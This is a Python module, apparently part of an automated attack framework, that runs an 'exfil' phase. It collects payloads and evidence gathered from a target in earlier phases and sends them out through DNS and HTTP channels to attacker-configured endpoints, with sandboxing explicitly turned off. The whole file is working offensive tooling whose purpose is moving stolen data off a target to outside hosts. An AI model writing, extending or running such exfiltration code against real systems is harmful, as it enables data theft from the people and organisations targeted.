import time
import logging
import os

from orchestrator.brain.phases.models import PhaseResult, Finding
from orchestrator.exfil.pipeline import ExfilPipeline

logger = logging.getLogger("phase_exfil")


async def run_exfil(target: str, findings: list = None) -> PhaseResult:
    t0 = time.time()
    errors = []

    payloads = []
    for f in (findings or []):
        if f.payload:
            payloads.append(f.payload)
        if f.evidence:
            payloads.append(f.evidence)

    if not payloads:
        return PhaseResult(
            phase="exfil",
            success=False,
            summary="No data available to exfiltrate from previous phases",
            raw_output="exfil skipped: no findings with payload or evidence data",
            latency=time.time() - t0,
            error="No exfiltratable data found in findings",
        )

    dns_domain = os.getenv("EXFIL_DNS_DOMAIN")
    http_endpoint = os.getenv("EXFIL_HTTP_ENDPOINT")
    smtp_server = os.getenv("EXFIL_SMTP_SERVER")

    pipeline = ExfilPipeline(
        dns_domain=dns_domain,
        http_endpoint=http_endpoint,
        smtp_server=smtp_server,
    )
    combined = "\n---\n".join(payloads[:10])
    results = {}

    if dns_domain:
        try:
            dns_result = await pipeline.run(data=combined, method="dns", use_sandbox=False)
            results["dns"] = dns_result
            logger.info(f"DNS exfil result: {dns_result.get('components', {}).get('dns', {})}")
        except Exception as e:
            logger.warning(f"DNS exfil failed: {e}")
            errors.append(f"dns:{e}")
    else:
        errors.append("dns:EXFIL_DNS_DOMAIN not set")

    if http_endpoint:
        try:
            http_result = await pipeline.run(data=combined, method="http", use_sandbox=False)
            results["http"] = http_result
            logger.info(f"HTTP exfil result: {http_result.get('components', {}).get('http', {})}")
        except Exception as e:
            logger.warning(f"HTTP exfil failed: {e}")
            errors.append(f"http:{e}")
    else:
        errors.append("http:EXFIL_HTTP_ENDPOINT not set")

    success = any(
        r.get("summary", {}).get("dns_available") or r.get("summary", {}).get("http_available")
        for r in results.values()
    )

    latency = time.time() - t0
    return PhaseResult(
        phase="exfil",
        success=success,
        summary=f"Exfil: {len(payloads)} items{' via DNS' if dns_domain else ''}{' via HTTP' if http_endpoint else ''}",
        raw_output=str(results) if results else f"No exfil channels configured (set EXFIL_DNS_DOMAIN or EXFIL_HTTP_ENDPOINT)",
        latency=latency,
        error="; ".join(errors) if errors else None,
    )
